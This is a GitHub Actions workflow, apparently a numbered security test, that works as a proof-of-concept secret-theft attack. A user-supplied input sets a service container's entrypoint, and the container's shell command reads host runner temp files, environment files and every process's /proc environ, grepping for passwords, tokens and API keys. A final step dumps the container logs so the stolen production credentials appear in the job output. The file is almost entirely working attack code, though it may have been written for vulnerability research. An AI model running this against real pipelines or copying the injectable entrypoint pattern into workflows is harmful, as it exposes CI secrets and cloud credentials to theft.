name: "Test 13: Secret exfiltration via container escape"
on:
  workflow_dispatch:
    inputs:
      entrypoint:
        description: "Entrypoint"
        required: false
        default: "/bin/sh"
env:
  PRODUCTION_DB_PASSWORD: ${{ secrets.PRODUCTION_DB_PASSWORD }}
  AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
  INTERNAL_API_TOKEN: ${{ secrets.INTERNAL_API_TOKEN }}
jobs:
  deploy-simulation:
    runs-on: ubuntu-latest
    name: "Simulated production deploy with secrets"
    env:
      DEPLOY_ENV: "production"
    services:
      helper:
        image: alpine:3.19
        entrypoint: ${{ github.event.inputs.entrypoint }}
        command: >-
          -c "
          echo '=== CONTAINER ESCAPE — SECRET EXFILTRATION PoC ===';
          echo;
          echo '=== 1. SEARCHING HOST FOR SECRETS ===';
          echo '--- Runner temp directory ---';
          ls -la /host/home/runner/work/_temp/ 2>&1;
          echo;
          echo '--- Script files in _temp (GitHub writes secret exports here) ---';
          find /host/home/runner/work/_temp -type f 2>/dev/null;
          echo;
          echo '--- Content of ALL script files ---';
          find /host/home/runner/work/_temp -name '*.sh' -exec echo '== FILE: {} ==' \; -exec cat {} \; 2>/dev/null;
          echo;
          echo '--- Environment files ---';
          find /host/home/runner/work/_temp -name '*.env' -exec echo '== FILE: {} ==' \; -exec cat {} \; 2>/dev/null;
          echo;
          echo '=== 2. SEARCHING /proc FOR SECRETS IN ENV VARS ===';
          echo '--- Listing all processes ---';
          ls -d /host/proc/[0-9]* 2>/dev/null | head -20;
          echo;
          echo '--- Environment of each process (looking for secrets) ---';
          for pid_dir in /host/proc/[0-9]*; do
            pid=\$(basename \$pid_dir);
            envvars=\$(cat \$pid_dir/environ 2>/dev/null | tr '\0' '\n' | grep -i 'PASSWORD\|SECRET\|TOKEN\|API_KEY\|DB_' 2>/dev/null);
            if [ -n \"\$envvars\" ]; then
              cmdline=\$(cat \$pid_dir/cmdline 2>/dev/null | tr '\0' ' ');
              echo \"=== PID \$pid (\$cmdline) ===\";
              echo \"\$envvars\";
              echo;
            fi;
          done;
          echo;
          echo '=== 3. RUNNER WORK DIRECTORY ===';
          find /host/home/runner/work/ -maxdepth 3 -type f 2>/dev/null | head -20;
          echo;
          echo '=== 4. RUNNER FILE COMMANDS (GitHub Actions internal) ===';
          find /host/home/runner/work/_temp/_runner_file_commands -type f -exec echo '== {} ==' \; -exec cat {} \; 2>/dev/null;
          echo;
          echo '=== EXFILTRATION COMPLETE ===';
          sleep 90
          "
    steps:
      - name: Normal deploy step (uses secrets legitimately)
        run: |
          echo "Deploying to $DEPLOY_ENV..."
          echo "DB connection: using secret (masked)"
          echo "API calls: using token (masked)"
          # Secrets are in environment here - this is normal usage

      - name: Wait for container scan
        run: sleep 25

      - name: Container findings
        run: |
          echo "=== WHAT THE ESCAPED CONTAINER FOUND ==="
          for CID in $(docker ps -aq); do
            docker logs "$CID" 2>&1
          done
